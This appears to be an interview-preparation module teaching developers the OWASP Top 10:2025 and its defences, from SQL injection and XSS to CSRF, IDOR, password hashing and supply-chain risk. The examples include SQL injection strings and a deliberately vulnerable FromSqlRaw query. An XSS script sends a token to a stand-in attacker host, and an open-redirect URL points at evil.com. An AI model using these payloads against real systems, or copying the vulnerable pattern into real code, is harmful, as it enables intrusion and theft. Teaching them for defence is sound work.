# Web Security — OWASP Top 10:2025 for Developers

Security questions separate developers who have shipped to real users from those who haven't. You have: FinSight enforced tenant isolation, scrubbed secrets and hardened auth; your course platform hashes passwords with scrypt and rate-limits logins; and at Farwaniya Hospital you granted role-based access to patient-system screens. This module turns that into vocabulary and gives you the standard answers.

> [!focus]
> **Entry must:** explain SQL injection, XSS and CSRF and how to prevent each; hashing vs encryption vs encoding; why passwords are hashed with a slow algorithm; why every authorisation check happens on the server.
> **Mid adds:** the OWASP Top 10:2025 categories, IDOR and multi-tenant isolation, Content Security Policy, secure headers, supply-chain risk, secret management, threat modelling.
> **Most asked:** *How do you prevent SQL injection?* · *What's XSS?* · *CSRF, and how do SameSite cookies help?* · *How do you store passwords?* · *Hashing vs encryption?* · *What's in the OWASP Top 10?*
> **Time budget:** 3 hours.

## S9.0 Foundations: identity, trust boundaries and the crypto toolkit 🟢

Three ideas sit under every answer in this module.

### Authentication and authorisation

- **Authentication** (often "authN") answers *who are you?*: a password, a passkey, a token from Google.
- **Authorisation** ("authZ") answers *what may you do?*: role checks ("is this an admin?") and object checks ("is this invoice yours?").

They map onto 401 and 403 ([[S1.4]]). Most broken-access-control breaches (A01) involve users who are perfectly well authenticated and simply weren't authorised.

### Trust boundaries

A **trust boundary** is any line where data passes from something you don't control to something you do. The biggest is between the user's browser and your server: the user can read and change everything on their side.

<figure class="dia"><svg viewBox="0 0 720 255" role="img" aria-label="Trust boundaries: the client is untrusted, the server validates and authorises every request, and data from other services also crosses a boundary">
<rect class="sR" x="10" y="30" width="200" height="190" rx="12" opacity=".55"/><text class="sRt" x="110" y="52" text-anchor="middle">Client: UNTRUSTED</text>
<rect class="sG" x="270" y="30" width="230" height="190" rx="12" opacity=".55"/><text class="sGt" x="385" y="52" text-anchor="middle">Your server: trusted</text>
<rect class="sB" x="560" y="30" width="150" height="190" rx="12"/><text class="sT" x="635" y="52" text-anchor="middle">Data &amp; services</text>
<text class="sC" x="110" y="84" text-anchor="middle">JavaScript &amp; HTML</text>
<text class="sC" x="110" y="106" text-anchor="middle">hidden fields, disabled UI</text>
<text class="sC" x="110" y="128" text-anchor="middle">JWT payload (readable)</text>
<text class="sC" x="110" y="150" text-anchor="middle">request bodies, headers</text>
<text class="sRt" x="110" y="190" text-anchor="middle">the user can change all of it</text>
<text class="sS" x="385" y="84" text-anchor="middle">validate input</text>
<text class="sS" x="385" y="106" text-anchor="middle">authenticate the caller</text>
<text class="sS" x="385" y="128" text-anchor="middle">authorise this action</text>
<text class="sS" x="385" y="150" text-anchor="middle">on THIS object</text>
<text class="sGt" x="385" y="190" text-anchor="middle">every request, every time</text>
<rect class="sB" x="580" y="80" width="110" height="34" rx="8"/><text class="sT" x="635" y="102" text-anchor="middle">database</text><rect class="sB" x="580" y="140" width="110" height="34" rx="8"/><text class="sT" x="635" y="162" text-anchor="middle">other APIs</text>
<line class="sLr" x1="240" y1="20" x2="240" y2="232" stroke-dasharray="6 4"/><text class="sRt" x="240" y="246" text-anchor="middle">trust boundary</text>
<line class="sLw" x1="530" y1="20" x2="530" y2="232" stroke-dasharray="6 4"/><text class="sWt" x="530" y="246" text-anchor="middle">another boundary</text>
<line class="sL" x1="212" y1="130" x2="266" y2="130" marker-end="url(#ah)"/><line class="sL" x1="502" y1="97" x2="576" y2="97" marker-end="url(#ah)"/><line class="sL" x1="502" y1="157" x2="576" y2="157" marker-end="url(#ah)"/>
</svg><figcaption>Security checks belong on the trusted side of each boundary. Client-side validation improves the user experience; it protects nothing.</figcaption></figure>

The same applies between services: a message from another team's API or from a queue crosses a boundary too, so validate it.

### The crypto toolkit

| Tool | What it does | Keys | Used for |
|---|---|---|---|
| **Hash** (SHA-256) | A fixed-size fingerprint; one-way | None | Integrity checks, Git object names ([[S2.0]]) |
| **Password hash** (Argon2id, bcrypt) | A deliberately slow, salted hash | None (the salt isn't secret) | Storing passwords ([[S9.7]]) |
| **MAC / HMAC** | A hash that needs a secret key: proves the sender knew the key and nothing changed | One shared secret | JWTs signed with HS256, webhook signatures |
| **Symmetric encryption** (AES-GCM) | Scrambles data; the same key unscrambles it | One shared secret | Data at rest, the bulk of TLS traffic |
| **Asymmetric encryption / key exchange** (RSA, ECDH) | Two keys: what one locks, only the other opens | Public and private pair | Agreeing a session key in TLS |
| **Digital signature** (RSA, ECDSA, Ed25519) | Sign with the private key; anyone verifies with the public key | Public and private pair | Certificates, JWTs signed with RS256 or ES256, signed packages |

<figure class="dia"><svg viewBox="0 0 720 258" role="img" aria-label="Four crypto building blocks: a hash, an HMAC with a shared key, symmetric encryption with a shared key, and a signature with a private key verified by a public key">
<text class="sT" x="16" y="42">Hash</text><rect class="sB" x="150" y="20" width="120" height="34" rx="6"/><text class="sC" x="210" y="42" text-anchor="middle">"invoice.pdf"</text><line class="sLm" x1="272" y1="37" x2="306" y2="37" marker-end="url(#ahm)"/><rect class="sV" x="310" y="20" width="100" height="34" rx="6"/><text class="sC" x="360" y="42" text-anchor="middle">SHA-256</text><line class="sLm" x1="412" y1="37" x2="446" y2="37" marker-end="url(#ahm)"/><rect class="sG" x="450" y="20" width="120" height="34" rx="6"/><text class="sC" x="510" y="42" text-anchor="middle">9f2c…e7 (32 B)</text><text class="sC" x="584" y="42">one-way, no key</text>
<text class="sT" x="16" y="96">HMAC</text><rect class="sB" x="150" y="74" width="120" height="34" rx="6"/><text class="sC" x="210" y="96" text-anchor="middle">message</text><line class="sLm" x1="272" y1="91" x2="306" y2="91" marker-end="url(#ahm)"/><rect class="sW" x="310" y="74" width="100" height="34" rx="6"/><text class="sC" x="360" y="96" text-anchor="middle">HMAC + key</text><line class="sLm" x1="412" y1="91" x2="446" y2="91" marker-end="url(#ahm)"/><rect class="sG" x="450" y="74" width="120" height="34" rx="6"/><text class="sC" x="510" y="96" text-anchor="middle">tag</text><text class="sC" x="584" y="96">only key holders</text>
<text class="sT" x="16" y="150">Symmetric</text><rect class="sB" x="150" y="128" width="120" height="34" rx="6"/><text class="sC" x="210" y="150" text-anchor="middle">plaintext</text><line class="sLm" x1="272" y1="145" x2="306" y2="145" marker-end="url(#ahm)"/><rect class="sW" x="310" y="128" width="100" height="34" rx="6"/><text class="sC" x="360" y="150" text-anchor="middle">AES + key K</text><line class="sLm" x1="412" y1="145" x2="446" y2="145" marker-end="url(#ahm)"/><rect class="sA" x="450" y="128" width="120" height="34" rx="6"/><text class="sC" x="510" y="150" text-anchor="middle">ciphertext</text><text class="sC" x="584" y="150">same K decrypts</text>
<text class="sT" x="16" y="204">Signature</text><rect class="sB" x="150" y="182" width="120" height="34" rx="6"/><text class="sC" x="210" y="204" text-anchor="middle">certificate</text><line class="sLm" x1="272" y1="199" x2="306" y2="199" marker-end="url(#ahm)"/><rect class="sR" x="310" y="182" width="100" height="34" rx="6"/><text class="sC" x="360" y="204" text-anchor="middle">private key</text><line class="sLm" x1="412" y1="199" x2="446" y2="199" marker-end="url(#ahm)"/><rect class="sG" x="450" y="182" width="120" height="34" rx="6"/><text class="sC" x="510" y="204" text-anchor="middle">signature</text><text class="sC" x="584" y="204">public key verifies</text>
<text class="sS" x="360" y="246" text-anchor="middle">TLS uses all of them: key exchange, a signed certificate, then fast symmetric encryption</text>
</svg><figcaption>The four building blocks. The question is always "who has which key?": nobody (hash), both sides (HMAC, AES), or one side privately with the other side public (signatures).</figcaption></figure>

> [!term] Salt
> A random value generated per password and stored next to its hash. It isn't secret; its job is to make identical passwords produce different hashes, so an attacker can't precompute a table or test one guess against every account at once.

## S9.1 The security mindset 🟢

- **Never trust input.** Everything from outside (bodies, query strings, headers, cookies, files, other services, even your own database if others write to it) is potentially hostile until validated.
- **Least privilege.** Every user, service account and database login gets the minimum it needs. FinSight's API didn't need `db_owner`.
- **Defence in depth.** Several independent layers, so one failure isn't a breach: validation, parameterised queries, authorisation, encryption, monitoring.
- **Fail closed.** If a check errors out, deny.
- **Secure by default.** The safe option is the default; the dangerous one needs a deliberate, reviewed choice.

> [!term] CIA triad
> The three goals of security: **Confidentiality** (only the right people see data), **Integrity** (data isn't altered without authorisation), **Availability** (the system works when needed).

> [!term] Threat modelling
> Asking, at design time: what are we building, what can go wrong, what are we doing about it, and did we do a good job? **STRIDE** is a checklist of threat types: Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege.

## S9.2 The OWASP Top 10:2025 at a glance 🟡 ⭐

The **OWASP Top 10** is a consensus list of the most critical web-application security risks, updated every few years. The 2025 edition, published in late 2025:

| # | Category | In one line | Main defences |
|---|---|---|---|
| A01 | **Broken Access Control** | Users act outside their permissions (see other tenants' data, call admin APIs) | Deny by default; check ownership on every request, server-side |
| A02 | **Security Misconfiguration** | Insecure defaults, verbose errors, open storage, missing headers | Hardened, repeatable configuration; remove what you don't use |
| A03 | **Software Supply Chain Failures** *(new)* | Compromised or vulnerable dependencies, build tools or pipelines | Lock files, scanning, trusted sources, protected CI |
| A04 | **Cryptographic Failures** | Sensitive data unencrypted, weak algorithms, poor key handling | TLS everywhere, modern algorithms, keys in a vault |
| A05 | **Injection** | Untrusted data interpreted as code (SQL, OS commands, XSS) | Parameterisation, output encoding, validation |
| A06 | **Insecure Design** | Flaws in the design itself, which no implementation can fix | Threat modelling, secure patterns, abuse cases |
| A07 | **Authentication Failures** | Weak login, session or credential handling | MFA, slow hashing, rate limits, secure sessions |
| A08 | **Software or Data Integrity Failures** | Trusting unsigned updates, unsafe deserialisation | Signatures, integrity checks, safe serialisers |
| A09 | **Security Logging & Alerting Failures** | Attacks go unseen | Log security events and alert on them |
| A10 | **Mishandling of Exceptional Conditions** *(new)* | Errors handled in ways that fail open or leak information | Fail closed, central error handling, no stack traces to users |

> [!say]
> "The 2025 list is led by broken access control, then security misconfiguration, and adds two new categories: software supply-chain failures and mishandling of exceptional conditions. Injection, which includes XSS, is now fifth. In practice I focus on server-side authorisation on every request, parameterised queries, output encoding, and keeping dependencies scanned."

## S9.3 Injection, especially SQL injection 🟢 ⭐

> [!term] SQL injection
> When user input is concatenated into a SQL string, so the input can change the query's meaning. `' OR 1=1 --` turns "find this user" into "find every user".

```csharp
// ❌ Vulnerable: input becomes part of the SQL text
var sql = $"SELECT * FROM Users WHERE Email = '{email}'";
db.Users.FromSqlRaw(sql);

// ✅ Parameterised: the input is sent separately and is always treated as data
db.Users.FromSql($"SELECT * FROM Users WHERE Email = {email}");       // EF Core: interpolation → parameters
// ✅ LINQ is parameterised automatically
db.Users.Where(u => u.Email == email);
// ✅ ADO.NET / Dapper
cmd.CommandText = "SELECT * FROM Users WHERE Email = @email";
cmd.Parameters.AddWithValue("@email", email);
connection.Query<User>("SELECT * FROM Users WHERE Email = @email", new { email });
```

> [!mistake] `FromSqlRaw` with string interpolation
> EF Core's `FromSql` and `FromSqlInterpolated` turn an interpolated string into parameters. `FromSqlRaw` does **not**: interpolating into it is injectable. The names look alike, and that's the trap.

Parameters can't be used for **identifiers** (table names, the ORDER BY column). For dynamic sorting, map user input to an **allow-list** of known column names.

Other injection types: **OS command** injection (never build shell commands from input; pass arguments as an array), **LDAP**, **NoSQL** (operators like `$ne` in a JSON body), and **template** injection.

<figure class="dia steps" data-start="1"><svg viewBox="0 0 720 220" role="img" aria-label="SQL injection: concatenated input changes the query's logic; a parameterised query keeps the input as data">
<text class="sC" x="20" y="26">code</text><text class="sM" x="70" y="26">var sql = "SELECT * FROM Users WHERE Email = '" + email + "'";</text>
<g data-s="1"><rect class="sV" x="20" y="42" width="680" height="34" rx="6"/><text class="sS" x="36" y="64">email typed by the attacker:</text><text class="sX" x="270" y="64">' OR 1=1 --</text></g>
<g data-s="2-3"><rect class="sB" x="20" y="92" width="680" height="40" rx="6"/><text class="sM" x="36" y="117">SELECT * FROM Users WHERE Email = ''</text><text class="sRt" x="330" y="117">OR 1=1</text><text class="sC" x="386" y="117">--'</text></g>
<g data-s="2-3"><text class="sGt" x="250" y="150" text-anchor="middle">empty string</text><text class="sRt" x="356" y="150" text-anchor="middle">attacker's logic</text><text class="sC" x="450" y="150">rest commented out</text></g>
<g data-s="3-3"><rect class="sR" x="20" y="166" width="680" height="40" rx="6" opacity=".6"/><text class="sS" x="360" y="191" text-anchor="middle">WHERE (Email = '')  OR  (1 = 1)   → true for every row → every user returned</text></g>
<g data-s="4-4"><rect class="sG" x="20" y="92" width="680" height="40" rx="6"/><text class="sM" x="36" y="117">SELECT * FROM Users WHERE Email = @email</text><text class="sC" x="470" y="117">(text never changes)</text></g>
<g data-s="4-4"><rect class="sB" x="20" y="166" width="680" height="40" rx="6"/><text class="sM" x="36" y="191">@email = "' OR 1=1 --"</text><text class="sGt" x="330" y="191">→ sent separately, compared as plain data → 0 rows</text></g>
</svg><ol class="dia-steps">
<li>The attacker types SQL into the email field instead of an email address.</li>
<li>Concatenation pastes it into the query text. The quote closes the string early, and the input becomes part of the SQL.</li>
<li>The database parses the text it was given: an empty email OR a condition that is always true. Every user comes back, and login checks built on this query pass.</li>
<li>Parameterised: the SQL text is fixed and contains only a placeholder. The value travels separately and can only ever be compared as data, so the same input matches nothing.</li>
</ol><figcaption>SQL injection is a parsing problem: never let input reach the parser as code.</figcaption></figure>

## S9.4 Cross-site scripting (XSS) 🟢 ⭐

> [!term] Cross-site scripting (XSS)
> An attacker gets their JavaScript to run in another user's browser, inside your site's origin, where it can read the page, act as the user and steal tokens in `localStorage`. **Stored** XSS is saved in your database (a comment); **reflected** XSS bounces off a URL parameter; **DOM-based** XSS happens entirely in client-side code.

<figure class="dia steps"><svg viewBox="0 0 720 255" role="img" aria-label="Stored XSS: an attacker saves a script in a comment, the site serves it to a victim, and it runs in the victim's browser to steal a token">
<text class="sT" x="80" y="24" text-anchor="middle">Attacker</text><line class="sD" x1="80" y1="34" x2="80" y2="246"/>
<text class="sT" x="280" y="24" text-anchor="middle">Your site + DB</text><line class="sD" x1="280" y1="34" x2="280" y2="246"/>
<text class="sT" x="470" y="24" text-anchor="middle">Victim's browser</text><line class="sD" x1="470" y1="34" x2="470" y2="246"/>
<text class="sT" x="650" y="24" text-anchor="middle">evil.example</text><line class="sD" x1="650" y1="34" x2="650" y2="246"/>
<g data-s="1"><line class="sLr" x1="80" y1="58" x2="276" y2="72" marker-end="url(#ahr)"/><text class="sC" x="178" y="52" text-anchor="middle">POST comment:</text><text class="sRt" x="178" y="92" text-anchor="middle">&lt;script&gt;fetch(evil + token)&lt;/script&gt;</text></g>
<g data-s="2"><rect class="sW" x="232" y="100" width="96" height="26" rx="6"/><text class="sC" x="280" y="118" text-anchor="middle">stored as-is</text></g>
<g data-s="3"><line class="sL" x1="466" y1="140" x2="284" y2="140" marker-end="url(#ah)"/><text class="sC" x="375" y="134" text-anchor="middle">GET /post/7</text><line class="sLr" x1="284" y1="160" x2="466" y2="170" marker-end="url(#ahr)"/><text class="sRt" x="375" y="186" text-anchor="middle">HTML with the script inside</text></g>
<g data-s="4-4"><rect class="sR" x="410" y="196" width="120" height="26" rx="6"/><text class="sC" x="470" y="214" text-anchor="middle">script runs</text><line class="sLr" x1="474" y1="230" x2="646" y2="230" marker-end="url(#ahr)"/><text class="sRt" x="560" y="222" text-anchor="middle">token stolen</text></g>
<g data-s="5-5"><rect class="sG" x="330" y="196" width="290" height="46" rx="8"/><text class="sC" x="475" y="214" text-anchor="middle">encoded: &amp;lt;script&amp;gt; shown as text</text><text class="sC" x="475" y="232" text-anchor="middle">CSP blocks inline scripts · HttpOnly cookie</text></g>
</svg><ol class="dia-steps">
<li>The attacker submits a comment containing a script instead of text.</li>
<li>Your server stores it unchanged. Storing it isn't the bug yet.</li>
<li>A victim opens the page, and the server (or the front end) inserts the comment into the HTML without encoding it.</li>
<li>The browser can't tell your scripts from the attacker's: it runs inside your origin, reads the token from <code>localStorage</code> and sends it away.</li>
<li>The defences, in layers: encoding on output turns <code>&lt;</code> into <code>&amp;lt;</code> so it displays as text; a CSP refuses inline scripts; a token in an HttpOnly cookie can't be read by script at all.</li>
</ol><figcaption>Stored XSS. The fix belongs at output time, because the same data may be safe in one context and dangerous in another.</figcaption></figure>

**Defences, in layers:**

1. **Output encoding by context.** HTML-encode text placed in HTML; use attribute encoding in attributes and JavaScript encoding in scripts. Frameworks do it for you: Angular templates, React JSX and Razor all **escape by default**.
2. **Don't bypass the framework.** The danger is the escape hatch: React's `dangerouslySetInnerHTML`, Angular's `bypassSecurityTrustHtml`, `innerHTML` in plain DOM code, `eval`. If you must render user HTML (a rich-text editor), sanitise it with a vetted library such as DOMPurify.
3. **Content Security Policy (CSP)**, a response header that tells the browser which scripts may run:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-r4nd0m'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'
```

   With a strict CSP, injected inline scripts don't execute even if encoding fails somewhere.
4. **HttpOnly cookies** for tokens, so XSS can't read them ([[S1.6]]).

> [!say]
> "XSS is getting your script to run in someone else's session. The main defence is contextual output encoding, which Angular and React do by default, so I avoid bypassing it with innerHTML or dangerouslySetInnerHTML, and I sanitise any user HTML with DOMPurify. On top of that, a strict Content Security Policy blocks inline scripts, and HttpOnly cookies keep tokens out of reach."

## S9.5 Cross-site request forgery (CSRF) 🟢 ⭐

> [!term] CSRF
> A malicious site makes the victim's browser send a request to your site. Because browsers attach cookies automatically, the request arrives **authenticated**, for example a hidden form that POSTs to `/transfer`. CSRF only matters when authentication rides on **cookies**.

<figure class="dia steps" data-start="1"><svg viewBox="0 0 720 255" role="img" aria-label="CSRF: a malicious page makes the victim's browser post to the bank with its cookie; SameSite cookies or an anti-forgery token block it">
<text class="sT" x="110" y="24" text-anchor="middle">Victim's browser</text><line class="sD" x1="110" y1="34" x2="110" y2="250"/>
<text class="sT" x="360" y="24" text-anchor="middle">evil.example</text><line class="sD" x1="360" y1="34" x2="360" y2="250"/>
<text class="sT" x="610" y="24" text-anchor="middle">bank.example</text><line class="sD" x1="610" y1="34" x2="610" y2="250"/>
<g data-s="1"><line class="sLg" x1="606" y1="56" x2="114" y2="64" marker-end="url(#ahg)"/><text class="sC" x="360" y="52" text-anchor="middle">earlier login: Set-Cookie: session=abc</text><rect class="sG" x="40" y="70" width="140" height="24" rx="6"/><text class="sC" x="110" y="86" text-anchor="middle">cookie stored</text></g>
<g data-s="2"><line class="sL" x1="114" y1="112" x2="356" y2="118" marker-end="url(#ah)"/><text class="sC" x="235" y="106" text-anchor="middle">visits a page</text><line class="sLr" x1="356" y1="132" x2="114" y2="138" marker-end="url(#ahr)"/><text class="sRt" x="235" y="152" text-anchor="middle">hidden form → POST bank/transfer</text></g>
<g data-s="3-3"><line class="sLr" x1="114" y1="172" x2="606" y2="184" marker-end="url(#ahr)"/><text class="sRt" x="360" y="168" text-anchor="middle">POST /transfer  Cookie: session=abc</text><rect class="sR" x="540" y="194" width="140" height="24" rx="6"/><text class="sC" x="610" y="210" text-anchor="middle">money moved</text></g>
<g data-s="4-4"><line class="sLm" x1="114" y1="172" x2="606" y2="184" marker-end="url(#ahm)"/><text class="sC" x="360" y="168" text-anchor="middle">POST /transfer  (no cookie: SameSite=Lax)</text><rect class="sG" x="540" y="194" width="140" height="24" rx="6"/><text class="sC" x="610" y="210" text-anchor="middle">401: not logged in</text></g>
<g data-s="5-5"><line class="sLm" x1="114" y1="172" x2="606" y2="184" marker-end="url(#ahm)"/><text class="sC" x="360" y="168" text-anchor="middle">POST /transfer  cookie, but no anti-forgery token</text><rect class="sG" x="540" y="194" width="140" height="24" rx="6"/><text class="sC" x="610" y="210" text-anchor="middle">400: rejected</text></g>
</svg><ol class="dia-steps">
<li>Earlier, the victim logged in to the bank, which set a session cookie.</li>
<li>Later the victim visits a malicious page. It contains a hidden form that submits a transfer to the bank as soon as the page loads.</li>
<li>If the cookie is <code>SameSite=None</code> (or an old browser ignores SameSite), the browser attaches it, and the bank sees a perfectly authenticated request.</li>
<li>With <code>SameSite=Lax</code> or <code>Strict</code>, the browser doesn't attach the cookie to a cross-site POST, so the bank sees an anonymous request.</li>
<li>An anti-forgery token is a second, independent defence: the bank's own pages include a secret value that evil.example can't read, and requests without it are refused.</li>
</ol><figcaption>CSRF rides on cookies being sent automatically. Remove the automatic cookie, or demand something only your own pages know.</figcaption></figure>

**Defences:**

- **SameSite cookies.** `Lax` (Chrome and Edge's default when the attribute is missing) blocks cookies on cross-site POSTs and `fetch`es; `Strict` blocks them on all cross-site requests.
- **Anti-forgery tokens.** The server issues a random token that the page must send back in a header or form field; a cross-site attacker can't read it. ASP.NET Core has this built in (`[ValidateAntiForgeryToken]`, `IAntiforgery`); Angular's `HttpClient` can send the token from a cookie as a header automatically.
- Never change state on `GET`.
- Bearer tokens sent in an `Authorization` header by your own code aren't attached automatically, so they aren't vulnerable to CSRF (but see XSS).

## S9.6 Broken access control: IDOR and tenant isolation 🟢 🟡 ⭐

> [!term] IDOR (Insecure Direct Object Reference)
> The API trusts an ID from the client without checking that the caller may access that object. `GET /api/invoices/1043` returns invoice 1043 to *anyone* logged in, so an attacker just counts upwards.

**Defences:**

- Check **ownership** on every request, on the server: "does invoice 1043 belong to the caller's company?". Hiding a button in the UI is not access control.
- **Deny by default**: every endpoint requires authorisation unless explicitly public (in ASP.NET Core, a fallback authorisation policy).
- Unguessable IDs (GUIDs) make enumeration harder but are **not** a fix on their own.
- Test it: a test that logs in as company A and requests company B's records must get 404 or 403.

> [!story]
> FinSight is multi-tenant: every query is filtered by the `CompanyId` from the user's JWT through **EF Core global query filters**, so a developer can't forget the `WHERE CompanyId = ...`. That's A01 prevention built into the data layer. The next step, listed in your gaps file, is the test that proves company A can't read company B. Mention both: the mechanism and how you'd verify it.

**Role vs resource checks.** `[Authorize(Roles = "Admin")]` answers "can this *kind* of user call this endpoint?". It doesn't answer "can *this* user touch *this* record?". You need both. At Farwaniya Hospital you granted access per screen by role, which is the first kind; patient-record systems also need the second.

## S9.7 Authentication failures and password storage 🟢 ⭐

**Passwords are hashed, never encrypted.** You never need to read a password back, only to check one.

> [!term] Hashing vs encryption vs encoding
> **Hashing** is one-way: you can't get the input back (SHA-256, or bcrypt for passwords). **Encryption** is two-way with a key: you can decrypt (AES, RSA). **Encoding** is just a reversible format change with **no secret**: Base64 and URL encoding are not security. A JWT's payload is Base64url-encoded, so anyone can read it.

**Password hashing done right:**

- A **slow, salted** algorithm designed for passwords: **Argon2id** (OWASP's first choice), **scrypt**, **bcrypt**, or **PBKDF2** with a high iteration count (what ASP.NET Core Identity uses).
- A **salt** (random per user, stored with the hash) makes identical passwords hash differently and defeats precomputed tables.
- **Never** plain SHA-256 or MD5: they're built to be fast, which helps attackers try billions of guesses per second.

<figure class="dia"><svg viewBox="0 0 720 210" role="img" aria-label="Password storage: password plus random salt through Argon2id, storing salt, parameters and hash; login repeats the computation and compares">
<text class="sT" x="16" y="30">Sign-up</text>
<rect class="sB" x="90" y="14" width="120" height="34" rx="8"/><text class="sC" x="150" y="36" text-anchor="middle">"correct horse…"</text><text class="sX" x="222" y="36" text-anchor="middle">+</text><rect class="sV" x="236" y="14" width="120" height="34" rx="8"/><text class="sC" x="296" y="36" text-anchor="middle">random salt</text>
<line class="sLm" x1="358" y1="31" x2="392" y2="31" marker-end="url(#ahm)"/><rect class="sW" x="396" y="10" width="120" height="42" rx="8"/><text class="sT" x="456" y="29" text-anchor="middle">Argon2id</text><text class="sC" x="456" y="45" text-anchor="middle">slow on purpose</text>
<line class="sLm" x1="518" y1="31" x2="548" y2="31" marker-end="url(#ahm)"/><rect class="sG" x="552" y="14" width="158" height="34" rx="6"/><text class="sC" x="631" y="36" text-anchor="middle">salt + params + hash</text>
<text class="sC" x="560" y="70" text-anchor="end">stored: $argon2id$v=19$m=19456,t=2,p=1$&lt;salt&gt;$&lt;hash&gt;</text>
<text class="sT" x="16" y="116">Log-in</text>
<rect class="sB" x="90" y="100" width="120" height="34" rx="8"/><text class="sC" x="150" y="122" text-anchor="middle">typed password</text><text class="sX" x="222" y="122" text-anchor="middle">+</text><rect class="sV" x="236" y="100" width="120" height="34" rx="8"/><text class="sC" x="296" y="122" text-anchor="middle">stored salt</text>
<line class="sLm" x1="358" y1="117" x2="392" y2="117" marker-end="url(#ahm)"/><rect class="sW" x="396" y="96" width="120" height="42" rx="8"/><text class="sT" x="456" y="115" text-anchor="middle">Argon2id</text><text class="sC" x="456" y="131" text-anchor="middle">same params</text>
<line class="sLm" x1="518" y1="117" x2="548" y2="117" marker-end="url(#ahm)"/><rect class="sA" x="552" y="100" width="158" height="34" rx="6"/><text class="sC" x="631" y="122" text-anchor="middle">equal to stored hash?</text>
<text class="sT" x="16" y="176">Why it works:</text>
<text class="sS" x="130" y="176">the salt means identical passwords get different hashes, so one guess can't test every account;</text>
<text class="sS" x="130" y="196">the slowness means each guess costs real time and memory, even on GPUs.</text>
</svg><figcaption>Password storage. The parameters shown are OWASP's minimum recommendation for Argon2id (19 MiB of memory, 2 iterations, 1 thread).</figcaption></figure>

> [!story]
> Your course-commerce platform hashes passwords with **scrypt** and rate-limits login attempts. That covers two A07 defences in one sentence.

**Other authentication defences:** multi-factor authentication; rate limiting and lockout with care (lockout can itself be a denial-of-service tool); checking new passwords against known-breached lists; generic error messages ("invalid email or password", never "no such user"); regenerating the session ID after login (prevents **session fixation**); short-lived tokens with refresh tokens ([[B7]]).

## S9.8 Cryptography and secrets, the practical part 🟡

- **In transit:** TLS everywhere, including between internal services where practical; HSTS ([[S1.5]]).
- **At rest:** database or disk encryption (SQL Server TDE, Azure Storage encryption), with extra column-level encryption for very sensitive fields.
- **Don't invent crypto.** Use the platform's libraries; use AES-GCM for symmetric encryption; generate random values with a cryptographic generator (`RandomNumberGenerator` in .NET, `crypto.getRandomValues` in browsers, `secrets` in Python), never `Random` or `Math.random`.
- **Secrets** (connection strings, API keys, signing keys) live in a vault (**Azure Key Vault**, AWS Secrets Manager) or the platform's secret store, injected at runtime, and rotated. Never in Git, never in images ([[S2.8]], [[S5.8]]).
- **Data minimisation:** the safest personal data is data you never collected. Mask it in logs; Egypt's **Personal Data Protection Law (No. 151 of 2020)** and, for European users, the GDPR make this a legal matter, not just good practice.

## S9.9 Misconfiguration and security headers 🟢 🟡

| Header | Purpose |
|---|---|
| `Strict-Transport-Security` | Force HTTPS |
| `Content-Security-Policy` | Restrict script, style and frame sources; `frame-ancestors` prevents clickjacking |
| `X-Content-Type-Options: nosniff` | Stop the browser guessing content types |
| `Referrer-Policy: strict-origin-when-cross-origin` | Limit what URLs leak to other sites |
| `Permissions-Policy` | Disable features you don't use (camera, geolocation) |

**Common misconfigurations:** detailed error pages or stack traces in production (`app.UseDeveloperExceptionPage()` left on), Swagger UI exposed publicly without auth, default credentials, overly permissive CORS (`AllowAnyOrigin` plus credentials isn't even allowed, but reflecting any `Origin` header is equivalent and dangerous), public storage buckets, debug endpoints, and unnecessary open ports (FinSight's network security group allowed only 22, 80 and 443 for this reason).

## S9.10 Software supply chain (A03, new in 2025) 🟡 ⭐

Your app is mostly other people's code. A typical Angular or React project has hundreds of transitive npm dependencies.

- **Lock files** (`package-lock.json`, `packages.lock.json`, `uv.lock`) committed, and installs that respect them (`npm ci`).
- **Scan dependencies:** `npm audit`, `dotnet list package --vulnerable`, `pip-audit`, plus **Dependabot** or Renovate for update pull requests.
- **Be careful what you add.** Check maintenance, download counts and the publisher; watch for **typosquatting** (`reqeusts` instead of `requests`). Several large npm package compromises in 2025 were spread by stolen maintainer credentials, which is why this category entered the Top 10.
- **Protect the pipeline:** least-privilege CI tokens, pinned GitHub Actions versions (ideally by commit hash), protected branches, signed artifacts and images, and a **software bill of materials (SBOM)** listing what's inside your build.

> [!term] SBOM (software bill of materials)
> A machine-readable inventory of every component and version in a piece of software (formats: SPDX, CycloneDX). When a new vulnerability is announced, it tells you in minutes whether you're affected.

## S9.11 Other attacks worth one sentence each 🟡

- **SSRF (server-side request forgery):** your server fetches a URL the user supplied, and the attacker points it at internal addresses (the cloud metadata service at `169.254.169.254`). Allow-list destinations; block private IP ranges.
- **File uploads:** check type by content, not extension; cap size; store outside the web root or in blob storage; generate the file name yourself; scan if needed.
- **Unsafe deserialisation:** never deserialise untrusted data into arbitrary types (`BinaryFormatter` is removed in modern .NET for this reason).
- **Open redirect:** `?returnUrl=https://evil.com` after login. Only redirect to local or allow-listed URLs (`Url.IsLocalUrl` in ASP.NET Core).
- **Mass assignment / over-posting:** binding a request straight onto an entity lets the client set `IsAdmin = true`. Bind to a DTO with only the allowed fields.
- **Denial of service:** rate limiting, request size limits, timeouts and pagination caps.

## S9.12 Errors and logging done safely (A09, A10) 🟡

- Return **generic** errors to clients (ASP.NET Core's `ProblemDetails` with a trace ID), and log the details server-side.
- **Fail closed:** if the authorisation service is down, deny; don't skip the check.
- Log security events: logins (success and failure), permission denials, password and role changes, unusual volumes. **Never** log passwords, tokens or full card numbers.
- Alert on the patterns that matter (many failed logins, a spike in 403s), or nobody will read the logs until after the breach.

> [!story]
> FinSight's **global exception handler** is exactly this: one place that converts unexpected exceptions into a safe response and a detailed log entry. Mention it under A10.

> [!lab] Attack your own API for an hour
> Run one of your APIs locally. Try `' OR '1'='1` in every text field; change the ID in a URL to someone else's record; send a request with no token and one with an expired token; post a field the DTO shouldn't accept; check the response headers with [securityheaders.com](https://securityheaders.com) once deployed. Each thing you find and fix is an interview story.

## S9.13 Interview drill 🟢 ⭐

| Question | Strong short answer |
|---|---|
| How do you prevent SQL injection? | Parameterised queries everywhere (LINQ, FromSql with interpolation, Dapper parameters), never concatenation, and allow-lists for identifiers like sort columns. |
| What's XSS and how do you stop it? | Attacker script running in a victim's session; contextual output encoding (framework default), sanitising user HTML, a strict CSP, and HttpOnly cookies. |
| What's CSRF? | A third-party site making the victim's browser send an authenticated request using its cookies; stopped by SameSite cookies and anti-forgery tokens. |
